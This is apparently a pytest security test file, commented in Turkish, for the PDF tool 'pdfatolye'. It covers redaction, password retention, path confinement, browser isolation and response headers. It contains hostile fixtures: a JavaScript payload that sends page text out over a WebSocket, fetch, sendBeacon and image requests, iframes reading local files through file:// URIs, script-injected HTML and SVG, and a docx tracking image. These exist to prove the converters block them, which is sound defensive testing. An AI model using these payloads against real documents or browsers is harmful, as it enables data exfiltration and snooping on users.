"""Faz A: kullanıcıya verilen gizlilik ve güvenlik vaatleri. Her test, denetimde gerçekten
yakalanmış bir açığın geri gelmemesi içindir: karartma, şifre koruması, disk erişimi, ağ yalıtımı,
başlıklar.
"""

from __future__ import annotations

import asyncio
import http.server
import threading
import zipfile
from pathlib import Path

import pikepdf
import pymupdf
import pytest
from fastapi.testclient import TestClient

from pdfatolye import engines
from pdfatolye.api import app as app_module
from pdfatolye.convert.html import print_html
from pdfatolye.convert.markdown import MarkdownPrinter
from pdfatolye.convert.markdown.parser import AssetResolver, parse_markdown
from pdfatolye.convert.office import convert_office
from pdfatolye.core import content, security
from pdfatolye.settings import Settings
from tests.fixtures import make_fixtures as fx

BROWSER = engines.detect_browser(Settings()).path
SOFFICE = engines.detect_libreoffice(Settings()).path
needs_browser = pytest.mark.skipif(not BROWSER, reason="Edge/Chrome yok")
needs_office = pytest.mark.skipif(not SOFFICE, reason="LibreOffice yok")


@pytest.fixture
def client(settings: Settings, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(engines, "detect_all", lambda _s: [])
    with TestClient(app_module.create_app(settings, start_background=False)) as c:
        assert c.get("/api/session").status_code == 200
        yield c


def upload(client: TestClient, path: Path, name: str | None = None) -> dict:
    r = client.post("/api/files", files=[("files", (name or path.name, path.read_bytes()))])
    assert r.status_code == 200, r.text
    return r.json()[0]


def run_job(client: TestClient, payload: dict) -> dict:
    r = client.post("/api/jobs", json=payload)
    assert r.status_code == 200, r.text
    client.app.state.jobs.wait(r.json()["id"], timeout=120)
    return client.get(f"/api/jobs/{r.json()['id']}").json()


def decoded_bytes(path: Path, tmp: Path) -> bytes:
    """Sıkıştırma ve nesne akışları açılmış ham dosya: içerikte arama için."""
    plain = tmp / f"{path.stem}_acik.pdf"
    with pikepdf.open(path) as pdf:
        pdf.save(plain, stream_decode_level=pikepdf.StreamDecodeLevel.all, compress_streams=False,
                 object_stream_mode=pikepdf.ObjectStreamMode.disable)
    return plain.read_bytes()


# --- karartma -------------------------------------------------------------------------------

BOX = [60, 75, 320, 125]


def _pdf_with_secrets(path: Path, *, rotation: int = 0, crop: bool = False) -> Path:
    """Görünümde `BOX` içine düşen gizli içerik: yazı, not, serbest metin, form alanı."""
    doc = pymupdf.open()
    page = doc.new_page()
    if crop:
        page.set_cropbox(pymupdf.Rect(20, 30, 590, 800))
    page.set_rotation(rotation)
    area = pymupdf.Rect(BOX) * page.derotation_matrix
    area.normalize()
    page.insert_textbox(area, "YAZIGIZLI", rotate=rotation % 360)
    page.add_text_annot(area.tl + (5, 5), "NOTGIZLI")
    page.add_freetext_annot(area, "SERBESTGIZLI").update()
    widget = pymupdf.Widget()
    widget.field_name, widget.field_type = "alan", pymupdf.PDF_WIDGET_TYPE_TEXT
    widget.field_value, widget.rect = "FORMGIZLI", area
    page.add_widget(widget)
    doc.save(path)
    doc.close()
    return path


@pytest.mark.parametrize(("rotation", "crop"), [(0, False), (90, False), (180, True), (270, True)])
def test_redaction_removes_annotations_and_form_fields(tmp_path, rotation, crop):
    src = _pdf_with_secrets(tmp_path / "s.pdf", rotation=rotation, crop=crop)
    out = tmp_path / "o.pdf"
    content.apply_ops(src, out, [content.RedactOp(type="redact", page=0, rect=BOX)])
    with pymupdf.open(out) as doc:
        page = doc[0]
        assert not list(page.annots()) and not list(page.widgets())
        assert "GIZLI" not in page.get_text()
    raw = decoded_bytes(out, tmp_path)
    for secret in (b"YAZIGIZLI", b"NOTGIZLI", b"SERBESTGIZLI", b"FORMGIZLI"):
        assert secret not in raw, secret


def test_redaction_keeps_what_is_outside_the_box(tmp_path):
    src = tmp_path / "s.pdf"
    doc = pymupdf.open()
    page = doc.new_page()
    page.add_text_annot((400, 400), "UZAK-NOT")
    widget = pymupdf.Widget()
    widget.field_name, widget.field_type = "uzak", pymupdf.PDF_WIDGET_TYPE_TEXT
    widget.field_value, widget.rect = "UZAK-FORM", pymupdf.Rect(300, 500, 500, 530)
    page.add_widget(widget)
    doc.save(src)
    doc.close()
    out = tmp_path / "o.pdf"
    content.apply_ops(src, out, [content.RedactOp(type="redact", page=0, rect=BOX)])
    with pymupdf.open(out) as result:
        assert [a.info["content"] for a in result[0].annots()] == ["UZAK-NOT"]
        assert [w.field_value for w in result[0].widgets()] == ["UZAK-FORM"]


def test_redaction_removes_link_and_page_thumbnail(tmp_path):
    src = tmp_path / "s.pdf"
    doc = pymupdf.open()
    page = doc.new_page()
    page.insert_link({"kind": pymupdf.LINK_URI, "from": pymupdf.Rect(BOX),
                      "uri": "https://gizli.example"})
    thumb = doc.get_new_xref()
    doc.update_object(thumb, "<< /Length 0 >>")
    doc.update_stream(thumb, b"KUCUKRESIMGIZLI")
    doc.xref_set_key(page.xref, "Thumb", f"{thumb} 0 R")
    doc.save(src)
    doc.close()
    assert b"KUCUKRESIMGIZLI" in decoded_bytes(src, tmp_path)
    out = tmp_path / "o.pdf"
    content.apply_ops(src, out, [content.RedactOp(type="redact", page=0, rect=BOX)])
    raw = decoded_bytes(out, tmp_path)
    assert b"gizli.example" not in raw and b"KUCUKRESIMGIZLI" not in raw


def test_redaction_warns_when_text_appears_elsewhere(tmp_path):
    src = tmp_path / "s.pdf"
    doc = pymupdf.open()
    for _ in range(2):
        doc.new_page().insert_text((72, 100), "Ahmet Kaya", fontname="helv")
    doc.set_toc([[1, "Ahmet hakkında", 1]])
    doc.set_metadata({"author": "Ahmet"})
    doc.embfile_add("ek.txt", b"ek")
    doc.save(src)
    doc.close()
    r = content.apply_ops(src, tmp_path / "o.pdf",
                          [content.RedactOp(type="redact", page=0, rect=[60, 80, 400, 110])])
    text = " ".join(r.warnings)
    for fragment in ("yer imlerinde", "belge bilgilerinde", "sayfa 2", "gömülü dosya"):
        assert fragment in text, r.warnings


def test_clean_redaction_has_no_warning(tmp_path):
    src = fx.numbered(tmp_path / "s.pdf", 2, with_toc=False)
    r = content.apply_ops(src, tmp_path / "o.pdf",
                          [content.RedactOp(type="redact", page=0, rect=[0, 0, 600, 800])])
    assert r.warnings == []


def test_redaction_job_mentions_old_version(client, tmp_path):
    meta = upload(client, _pdf_with_secrets(tmp_path / "s.pdf"))
    job = run_job(client, {"type": "apply", "file": meta["id"], "ops": [
        {"type": "redact", "page": 0, "rect": BOX}]})
    assert job["status"] == "bitti", job
    assert any("önceki sürüm" in w for w in job["warnings"])


# --- şifre koruması -------------------------------------------------------------------------

def _encrypted(client, tmp_path, name="gizli.pdf") -> tuple[dict, dict]:
    meta = upload(client, fx.numbered(tmp_path / name, 3, with_toc=False, password="parola"))
    assert meta["encrypted"]
    return meta, {meta["id"]: "parola"}


def _still_locked(path: Path, password: str = "parola") -> None:
    with pytest.raises(pikepdf.PasswordError):
        pikepdf.open(path)
    with pikepdf.open(path, password=password) as pdf:
        assert pdf.encryption.R == 6 and pdf.encryption.bits == 256


@pytest.mark.parametrize("kind", ["apply", "compose", "clean_metadata", "repair", "compress"])
def test_editing_encrypted_pdf_keeps_password(client, tmp_path, kind):
    meta, pw = _encrypted(client, tmp_path)
    payload = {
        "apply": {"type": "apply", "file": meta["id"], "ops": [
            {"type": "rect", "page": 0, "rect": [10, 10, 50, 50]}]},
        "compose": {"type": "compose", "target": "version", "base_file": meta["id"],
                    "items": [{"file": meta["id"], "page": 1}]},
        "clean_metadata": {"type": "clean_metadata", "file": meta["id"], "target": "version"},
        "repair": {"type": "repair", "file": meta["id"], "target": "version"},
        "compress": {"type": "compress", "files": [meta["id"]], "level": "kayipsiz"},
    }[kind]
    job = run_job(client, payload | {"passwords": pw})
    assert job["status"] == "bitti", job
    out = job["files"][0]["id"] if kind == "compress" else meta["id"]
    store = client.app.state.store
    _still_locked(store.path(out))
    assert store.get(out).encrypted


def test_split_parts_keep_password(client, tmp_path):
    meta, pw = _encrypted(client, tmp_path)
    job = run_job(client, {"type": "split", "file": meta["id"], "passwords": pw})
    assert job["status"] == "bitti" and len(job["files"]) == 3
    for f in job["files"]:
        _still_locked(client.app.state.store.path(f["id"]))


def test_decrypt_is_the_only_way_to_remove_password(client, tmp_path):
    meta, pw = _encrypted(client, tmp_path)
    job = run_job(client, {"type": "decrypt", "file": meta["id"], "passwords": pw})
    assert job["status"] == "bitti"
    assert not job["files"][0]["encrypted"]


def test_merge_with_encrypted_source_warns(client, tmp_path):
    meta, pw = _encrypted(client, tmp_path)
    other = upload(client, fx.numbered(tmp_path / "acik.pdf", 1, with_toc=False))
    job = run_job(client, {"type": "merge", "files": [meta["id"], other["id"]], "passwords": pw})
    assert job["status"] == "bitti", job
    assert any("gizli.pdf" in w and "taşınmadı" in w for w in job["warnings"])


def test_compose_new_file_from_mixed_sources_warns(client, tmp_path):
    meta, pw = _encrypted(client, tmp_path)
    other = upload(client, fx.numbered(tmp_path / "acik.pdf", 1, with_toc=False))
    job = run_job(client, {"type": "compose", "target": "new", "passwords": pw, "items": [
        {"file": meta["id"], "page": 0}, {"file": other["id"], "page": 0}]})
    assert any("taşınmadı" in w for w in job["warnings"])


def test_restrictions_survive_editing(tmp_path):
    src = fx.numbered(tmp_path / "n.pdf", 1, with_toc=False)
    restricted = tmp_path / "k.pdf"
    with pikepdf.open(src) as pdf:
        pdf.save(restricted, encryption=pikepdf.Encryption(
            user="", owner="sahip", allow=pikepdf.Permissions(extract=False)))
    out = fx.numbered(tmp_path / "o.pdf", 1, with_toc=False)
    assert security.keep_encryption(restricted, out) == []
    with pikepdf.open(out) as pdf:  # açılış şifresi yok, kısıt duruyor
        assert pdf.is_encrypted and not pdf.allow.extract
        assert not pdf.owner_password_matched


def test_opened_with_owner_password_is_reported(tmp_path):
    src = fx.numbered(tmp_path / "n.pdf", 1, with_toc=False)
    locked = tmp_path / "k.pdf"
    with pikepdf.open(src) as pdf:
        pdf.save(locked, encryption=pikepdf.Encryption(user="acilis", owner="sahip1"))
    out = fx.numbered(tmp_path / "o.pdf", 1, with_toc=False)
    notes = security.keep_encryption(locked, out, "sahip1")
    assert any("Sahip şifresiyle" in n for n in notes)
    with pikepdf.open(out, password="sahip1") as pdf:
        assert pdf.is_encrypted


def test_missing_password_is_reported(tmp_path):
    locked = fx.numbered(tmp_path / "k.pdf", 1, with_toc=False, password="parola")
    out = fx.numbered(tmp_path / "o.pdf", 1, with_toc=False)
    assert any("şifresiz kaldı" in n for n in security.keep_encryption(locked, out))


def test_keep_encryption_ignores_plain_source(tmp_path):
    src = fx.numbered(tmp_path / "n.pdf", 1, with_toc=False)
    out = fx.numbered(tmp_path / "o.pdf", 1, with_toc=False)
    assert security.keep_encryption(src, out) == []
    with pikepdf.open(out) as pdf:
        assert not pdf.is_encrypted


def test_cli_keeps_password_even_when_overwriting_input(tmp_path):
    from typer.testing import CliRunner

    from pdfatolye.cli import app as cli

    src = fx.numbered(tmp_path / "k.pdf", 3, with_toc=False, password="parola")
    r = CliRunner().invoke(cli, ["sil", str(src), "1", "--sifre", "parola", "-o", str(src)])
    assert r.exit_code == 0, r.output
    _still_locked(src)
    assert fx.labels(src, password="parola") == ["Sayfa 2", "Sayfa 3"]


# --- izin kısıtları -------------------------------------------------------------------------


def test_restrictions_without_owner_password_are_effective(tmp_path):
    src = fx.numbered(tmp_path / "n.pdf", 1, with_toc=False)
    out = tmp_path / "o.pdf"
    r = security.encrypt(src, out, "acilis1", allow_copy=False)
    assert any("rastgele" in n for n in r.notes)
    with pikepdf.open(out, password="acilis1") as pdf:
        assert not pdf.owner_password_matched  # açan kişi tam yetkili sayılmaz
        assert not pdf.allow.extract
    with pymupdf.open(out) as doc:
        assert doc.authenticate("acilis1")
        assert not doc.permissions & pymupdf.PDF_PERM_COPY


def test_same_owner_password_with_restrictions_is_refused(tmp_path):
    src = fx.numbered(tmp_path / "n.pdf", 1, with_toc=False)
    with pytest.raises(security.PdfAtolyeError, match="farklı olmalı"):
        security.encrypt(src, tmp_path / "o.pdf", "ayni1", owner_password="ayni1", allow_copy=False)


def test_no_restrictions_keeps_single_password(tmp_path):
    src = fx.numbered(tmp_path / "n.pdf", 1, with_toc=False)
    out = tmp_path / "o.pdf"
    security.encrypt(src, out, "acilis1")
    with pikepdf.open(out, password="acilis1") as pdf:
        assert pdf.owner_password_matched


# --- disk erişimi ---------------------------------------------------------------------------


def _png(path: Path) -> Path:
    return fx.transparent_png(path)


def test_preview_cannot_read_absolute_paths(client, tmp_path):
    secret = _png(tmp_path / "disk.png")
    r = client.post("/api/md/preview", json={"text": f"![x]({secret.as_posix()})"}).json()
    assert "/api/md/asset/" not in r["html"]
    assert any("bulunamadı" in w for w in r["warnings"])


def test_preview_cannot_read_relative_escape(client, settings, tmp_path):
    (settings.data_dir / "bos").mkdir(parents=True, exist_ok=True)
    _png(settings.data_dir / "disari.png")
    r = client.post("/api/md/preview", json={"text": "![x](../disari.png)"}).json()
    assert "/api/md/asset/" not in r["html"]


def test_preview_stays_inside_vault(settings, tmp_path, monkeypatch):
    monkeypatch.setattr(engines, "detect_all", lambda _s: [])
    vault = tmp_path / "kasa"
    (vault / "alt").mkdir(parents=True)
    _png(vault / "alt" / "ic.png")
    outside = _png(tmp_path / "dis.png")
    settings.vault_path = vault
    with TestClient(app_module.create_app(settings, start_background=False)) as c:
        c.get("/api/session")
        inside = c.post("/api/md/preview", json={"text": "![[ic.png]]"}).json()
        assert "/api/md/asset/" in inside["html"]
        src = inside["html"].split('<img src="')[1].split('"')[0]
        assert c.get(src).status_code == 200
        escape = c.post("/api/md/preview", json={"text": "![x](../dis.png)"}).json()
        assert "/api/md/asset/" not in escape["html"]
        absolute = c.post("/api/md/preview", json={"text": f"![x]({outside.as_posix()})"}).json()
        assert "/api/md/asset/" not in absolute["html"]


def test_preview_asset_needs_session(client, tmp_path):
    img = upload(client, _png(tmp_path / "ek.png"))
    r = client.post("/api/md/preview", json={"text": "![[ek.png]]", "attachments": [img["id"]]})
    src = r.json()["html"].split('<img src="')[1].split('"')[0]
    assert client.get(src).status_code == 200
    with TestClient(client.app) as stranger:
        assert stranger.get(src).status_code == 403


def test_only_images_resolve_even_for_own_notes(tmp_path):
    (tmp_path / "gizli.txt").write_text("x", encoding="utf-8")
    html = parse_markdown("![x](gizli.txt)", base_dir=tmp_path).body_html
    assert "file:" not in html and "Resim bulunamadı" in html


def test_cli_notes_may_use_relative_parent_folder(tmp_path):
    """Komut satırında kullanıcı kendi notunu basar: ../resimler/ yaygın ve geçerli."""
    (tmp_path / "resimler").mkdir()
    (tmp_path / "notlar").mkdir()
    img = _png(tmp_path / "resimler" / "a.png")
    assert AssetResolver(tmp_path / "notlar").resolve("../resimler/a.png") == img.resolve()
    confined = AssetResolver(tmp_path / "notlar", confine=True)
    assert confined.resolve("../resimler/a.png") is None


# --- tarayıcı yalıtımı ----------------------------------------------------------------------


@pytest.fixture
def disk_secret(tmp_path: Path) -> Path:
    secret = tmp_path / "disk-sirri.txt"
    secret.write_text("DISKTEKIGIZLIMETIN", encoding="utf-8")
    return secret


def _pdf_text(path: Path) -> str:
    with pymupdf.open(path) as doc:
        return "".join(page.get_text() for page in doc)


@pytest.fixture
def listeners():
    """Yerel WebSocket ve HTTP dinleyicileri: belge dışarıya bir şey gönderebiliyor mu?"""
    import websockets

    received: list[str] = []
    ready = threading.Event()
    ports: dict[str, int] = {}
    stop_loop: list = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def _hit(self):
            received.append(f"http:{self.path}")
            self.send_response(204)
            self.end_headers()

        do_GET = do_POST = do_HEAD = _hit

        def log_message(self, *args):
            pass

    http_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    ports["http"] = http_srv.server_address[1]
    threading.Thread(target=http_srv.serve_forever, daemon=True).start()

    async def on_ws(ws):
        received.append(f"ws:{await ws.recv()}")

    def run_ws():
        async def main():
            stop = asyncio.get_running_loop().create_future()
            stop_loop.append((asyncio.get_running_loop(), stop))
            async with websockets.serve(on_ws, "127.0.0.1", 0) as srv:
                ports["ws"] = srv.sockets[0].getsockname()[1]
                ready.set()
                await stop
        asyncio.run(main())

    thread = threading.Thread(target=run_ws, daemon=True)
    thread.start()
    assert ready.wait(5)
    yield ports, received
    http_srv.shutdown()
    loop, stop = stop_loop[0]
    loop.call_soon_threadsafe(stop.set_result, None)
    thread.join(5)


def _exfil_script(ports: dict[str, int]) -> str:
    return (
        "<script>"
        f"try {{ const w = new WebSocket('ws://127.0.0.1:{ports['ws']}');"
        "w.onopen = () => w.send(document.body.innerText); } catch (e) {}"
        f"fetch('http://127.0.0.1:{ports['http']}/fetch', {{mode: 'no-cors'}}).catch(() => {{}});"
        f"navigator.sendBeacon('http://127.0.0.1:{ports['http']}/beacon', 'x');"
        f"new Image().src = 'http://127.0.0.1:{ports['http']}/img';"
        "const t = Date.now(); while (Date.now() - t < 400);"
        "</script>"
    )


@needs_browser
def test_html_print_blocks_disk_files_outside_its_folder(tmp_path, disk_secret):
    folder = tmp_path / "belge"
    folder.mkdir()
    page = folder / "kotu.html"
    page.write_text(f'<h1>Masum</h1><iframe src="{disk_secret.as_uri()}"></iframe>',
                    encoding="utf-8")
    out = tmp_path / "o.pdf"
    r = print_html(page, out, browser_path=BROWSER)
    assert "DISKTEKIGIZLIMETIN" not in _pdf_text(out)
    assert any("disk-sirri.txt" in w and "güvenlik" in w for w in r.warnings)


@needs_browser
def test_html_print_still_loads_files_from_its_own_folder(tmp_path):
    (tmp_path / "stil.css").write_text("h1 { color: rgb(255, 0, 0); }", encoding="utf-8")
    (tmp_path / "ek.js").write_text("document.body.append('BETIKCALISTI');", encoding="utf-8")
    page = tmp_path / "b.html"
    page.write_text('<link rel="stylesheet" href="stil.css"><h1>Başlık</h1><script src="ek.js">'
                    "</script>", encoding="utf-8")
    out = tmp_path / "o.pdf"
    r = print_html(page, out, browser_path=BROWSER)
    assert "BETIKCALISTI" in _pdf_text(out) and r.warnings == []


@needs_browser
def test_confined_html_print_sees_only_itself(tmp_path):
    (tmp_path / "ek.js").write_text("document.body.append('YANDOSYA');", encoding="utf-8")
    page = tmp_path / "b.html"
    page.write_text('<h1>Başlık</h1><script src="ek.js"></script>', encoding="utf-8")
    out = tmp_path / "o.pdf"
    print_html(page, out, browser_path=BROWSER, confine=True)
    assert "YANDOSYA" not in _pdf_text(out)


@needs_browser
def test_web_html_job_cannot_read_disk_or_store(client, tmp_path, disk_secret):
    """Arayüzden yüklenen HTML: ne diskteki dosya ne de deponun kendi dosyaları görünür."""
    page = tmp_path / "kotu.html"
    page.write_text(f'<h1>Masum</h1><iframe src="{disk_secret.as_uri()}"></iframe>'
                    '<iframe src="meta.json"></iframe>', encoding="utf-8")
    meta = upload(client, page)
    job = run_job(client, {"type": "office_to_pdf", "files": [meta["id"]]})
    assert job["status"] == "bitti", job
    text = _pdf_text(client.app.state.store.path(job["files"][0]["id"]))
    assert "Masum" in text
    assert "DISKTEKIGIZLIMETIN" not in text and meta["id"] not in text


@needs_browser
def test_web_markdown_job_cannot_embed_disk_image(client, tmp_path):
    secret = fx.photo_jpeg(tmp_path / "gizli.jpg", (400, 200))
    job = run_job(client, {"type": "md_to_pdf", "name": "n.md", "text": (
        f"# Not\n\n![x]({secret.as_posix()})\n\n<img src=\"{secret.as_uri()}\">\n")})
    assert job["status"] == "bitti", job
    with pymupdf.open(client.app.state.store.path(job["files"][0]["id"])) as doc:
        # Tarayıcı engellenen resmin yerine küçük bir "kırık resim" simgesi çizebilir (14x16).
        assert all(img[2] < 100 and img[3] < 100 for img in doc[0].get_images())
    assert any("bulunamadı" in w for w in job["warnings"])
    assert any("gizli.jpg" in w and "güvenlik" in w for w in job["warnings"])


@needs_browser
def test_html_print_cannot_send_anything_out(tmp_path, listeners):
    ports, received = listeners
    page = tmp_path / "s.html"
    page.write_text(f"<h1>Belge içeriği</h1>{_exfil_script(ports)}", encoding="utf-8")
    print_html(page, tmp_path / "o.pdf", browser_path=BROWSER)
    assert received == []


@needs_browser
def test_markdown_print_blocks_scripts_disk_and_network(tmp_path, disk_secret, listeners):
    ports, received = listeners
    note = tmp_path / "kotu.md"
    note.write_text(
        f'# Not\n\nformül $x^2$\n\n<iframe src="{disk_secret.as_uri()}"></iframe>\n\n'
        f"<script>document.body.append('NOTBETIGI')</script>\n\n{_exfil_script(ports)}\n\n"
        f'<img src="{disk_secret.with_suffix(".png").as_uri()}">\n',
        encoding="utf-8",
    )
    out = tmp_path / "o.pdf"
    with MarkdownPrinter(BROWSER) as printer:
        r = printer.convert(note, out)
    text = _pdf_text(out)
    assert "DISKTEKIGIZLIMETIN" not in text and "NOTBETIGI" not in text
    assert received == []
    assert not any("formül çizilemedi" in w for w in r.warnings)  # KaTeX yine çalışır
    assert "x" in text


@needs_browser
def test_markdown_print_reports_blocked_local_image(tmp_path):
    """İzinli olmayan yerel resim sessizce kaybolmaz: kullanıcı nedenini görür."""
    outside = fx.photo_jpeg(tmp_path / "disarida.jpg")
    (tmp_path / "not").mkdir()
    note = tmp_path / "not" / "n.md"
    note.write_text(f'# Not\n\n<img src="{outside.as_uri()}">\n', encoding="utf-8")
    with MarkdownPrinter(BROWSER) as printer:
        r = printer.convert(note, tmp_path / "o.pdf")
    assert any("disarida.jpg" in w and "güvenlik" in w for w in r.warnings), r.warnings


@needs_browser
def test_markdown_print_still_embeds_resolved_images(tmp_path):
    (tmp_path / "resimler").mkdir()
    fx.transparent_png(tmp_path / "resimler" / "a.png")
    note = tmp_path / "n.md"
    note.write_text("# Not\n\n![](resimler/a.png)\n", encoding="utf-8")
    out = tmp_path / "o.pdf"
    with MarkdownPrinter(BROWSER) as printer:
        r = printer.convert(note, out)
    assert not any("açılamadı" in w or "güvenlik" in w for w in r.warnings), r.warnings
    with pymupdf.open(out) as doc:
        assert doc[0].get_images()


@needs_office
def test_libreoffice_does_not_fetch_remote_images(tmp_path):
    """Word belgesindeki uzak resim bağlantısı izleme için kullanılabilir: istek gitmemeli."""
    hits: list[str] = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def _hit(self):
            hits.append(self.path)
            self.send_response(404)
            self.end_headers()

        do_GET = do_HEAD = _hit

        def log_message(self, *args):
            pass

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        src = fx.docx(tmp_path / "uzak.docx", ["Metin"])
        with zipfile.ZipFile(src, "a") as z:
            z.writestr("word/_rels/document.xml.rels", (
                '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
                'package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.'
                'openxmlformats.org/officeDocument/2006/relationships/image" Target="http://'
                f'127.0.0.1:{srv.server_address[1]}/izleme.png" TargetMode="External"/>'
                "</Relationships>"))
        convert_office(src, tmp_path / "o.pdf", soffice=SOFFICE)
    finally:
        srv.shutdown()
    assert hits == []


# --- uygulama başlıkları --------------------------------------------------------------------


def test_every_response_has_security_headers(client):
    for path in ("/", "/api/files", "/api/health", "/api/yok"):
        headers = client.get(path).headers
        assert headers["x-content-type-options"] == "nosniff", path
        assert headers["referrer-policy"] == "no-referrer", path
        csp = headers["content-security-policy"]
        assert "script-src 'self'" in csp and "object-src 'none'" in csp, path
        assert "'unsafe-inline' " not in csp.split("script-src")[1].split(";")[0], path


def test_uploaded_html_and_svg_cannot_run_in_app_origin(client, tmp_path):
    page = tmp_path / "kotu.html"
    page.write_text("<script>alert(1)</script>", encoding="utf-8")
    html = upload(client, page)
    r = client.get(f"/api/files/{html['id']}/raw")
    assert r.headers["content-disposition"].startswith("attachment")
    assert r.headers["content-security-policy"].startswith("sandbox")
    svg = tmp_path / "kotu.svg"
    svg.write_text('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
                   encoding="utf-8")
    meta = upload(client, svg)
    r = client.get(f"/api/files/{meta['id']}/raw")
    assert r.headers["content-security-policy"].startswith("sandbox")


def test_pdf_raw_stays_inline_for_viewer(client, tmp_path):
    meta = upload(client, fx.numbered(tmp_path / "a.pdf", 1, with_toc=False))
    r = client.get(f"/api/files/{meta['id']}/raw")
    assert r.headers["content-type"] == "application/pdf"
    assert r.headers["content-disposition"].startswith("inline")
    assert not r.headers["content-security-policy"].startswith("sandbox")


def test_api_docs_are_off(client):
    for path in ("/api/docs", "/redoc", "/docs", "/api/openapi.json", "/openapi.json"):
        assert "swagger" not in client.get(path).text.lower(), path
